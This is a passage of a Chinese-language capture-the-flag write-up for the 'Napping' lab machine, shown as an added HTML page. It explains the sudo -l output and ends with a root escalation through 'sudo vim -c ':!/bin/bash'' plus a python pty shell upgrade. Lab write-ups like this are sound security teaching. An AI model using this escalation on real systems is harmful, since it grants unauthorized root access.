+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>Matching Defaults entries <span style="color:#ff7b72">for</span> adrian on napping:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>    <span style="color:#79c0ff">secure_path</span><span style="color:#ff7b72;font-weight:bold">=</span>/usr/local/sbin<span style="color:#79c0ff">\:</span>/usr/local/bin<span style="color:#79c0ff">\:</span>/usr/sbin<span style="color:#79c0ff">\:</span>/usr/bin<span style="color:#79c0ff">\:</span>/sbin<span style="color:#79c0ff">\:</span>/bin<span style="color:#79c0ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">7</span><span>User adrian may run the following commands on napping:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">8</span><span>    <span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span> NOPASSWD: /usr/bin/vim</span></span></code></pre></div><ul>
+<li><code>env_reset</code>出于安全考虑，当运行<code>sudo</code>时，系统会重置大部分当前用户的环境变量，只保留极少数俺去那的变量，防止用户构造恶意的环境变量来劫持<code>root</code>进程</li>
+<li><code>mail_badpass</code>若有人尝试<code>sudo</code>但输错了密码，系统会给管理员发送通知邮件</li>
+<li><code>secure_path</code>是<code>sudo</code>执行命令时唯一信任的搜索路径，即使在自己的家目录写下一个名为<code>vim</code>的恶意脚本，如果执行<code>sudo vim</code>，系统也只会从指定的目录找真的<code>vim</code></li>
+<li>该用户能不需要密码使用root权限的<code>vim</code></li>
+</ul>
+<h3 id="34vim提权">3.4vim提权<a class="anchor" href="#34vim%e6%8f%90%e6%9d%83">#</a></h3>
+<p><code>sudo vim -c ':!/bin/bash'</code></p>
+<ul>
+<li><code>-c</code>是vim的命令行参数，启动后立即执行后面的vim指令</li>
+<li><code>:!</code>，在vim内部，<code>!</code>用于调用外部shell命令（就像<code>:wq</code>能保存并退出一样）</li>
+<li>执行过程：命令root身份的vim去执行<code>/bin/bash</code>，此时vim会分叉出子进程</li>
+</ul>
+<p><code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code>升级一下shell，成功变为root</p>
+<ul>
+<li><code>-c</code>告诉python直接运行引号内的代码，而不是打开一个文件</li>
+<li><code>import pty</code>导入python的伪终端模块</li>
+<li><code>pty.spawn(&quot;/bin/bash&quot;)</code>，<code>spawn</code>意味着孵化，会启动一个新的<code>/bin/bash</code>进程，并将其标准输入/输出连接到一个伪终端(PTY)上</li>
+</ul>
+<p>最后<code>cd /root</code>收获flag，</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>root@napping:~# cat root.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>cat root.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>Admins just can<span style="color:#f85149">&#39;</span>t stay awake tsk tsk tsk</span></span></code></pre></div><p>管理员就是没法保持清醒，啧啧啧</p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <footer class="custom-footer">
+  <span class="status-dot"></span>
+  <span>2026 vnccer <a href="https://creativecommons.org/licenses/by/4.0/" target="_blank" class="license-link">CC BY 4.0</a></span>
+</footer>
+ 
+        
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+        
+        
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
